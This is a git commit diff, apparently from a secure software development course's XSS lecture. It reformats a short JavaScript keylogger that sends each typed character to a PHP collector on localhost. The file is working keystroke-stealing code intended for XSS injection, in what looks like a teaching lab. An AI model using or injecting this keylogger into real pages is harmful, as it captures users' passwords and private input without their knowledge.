ae62321713710a6ca712e8e9d37cf4f63c207eff
celalceken <celalceken@gmail.com>
2016-05-09 01:26:01 +0300

    XSS

--- Lecture4/2XSS/5KeyLogger/KeyLogger.js
+++ Lecture4/2XSS/5KeyLogger/KeyLogger.js
@@ -5,13 +5,15 @@
  Simple javascript keylogger by Th3_M4d_H4tt3r
  */
 
-document.onkeypress = function(evt) {
-    evt = evt || window.event
+document.onkeypress = function(evt)
+{
+    evt = evt || window.event//IE
     key = String.fromCharCode(evt.charCode)
-    if (key) {
+    if (key)
+    {
         var http = new XMLHttpRequest();
         var param = encodeURI(key)
-        http.open("POST","http://localhost/SecureSoftwareDevelopment/Lecture4/2XSS/4KeyLogger/KeyLogger.php",true);
+        http.open("POST","http://localhost/SecureSoftwareDevelopment/Lecture4/2XSS/5KeyLogger/KeyLogger.php",true);
         http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
         http.send("key="+param);
     }
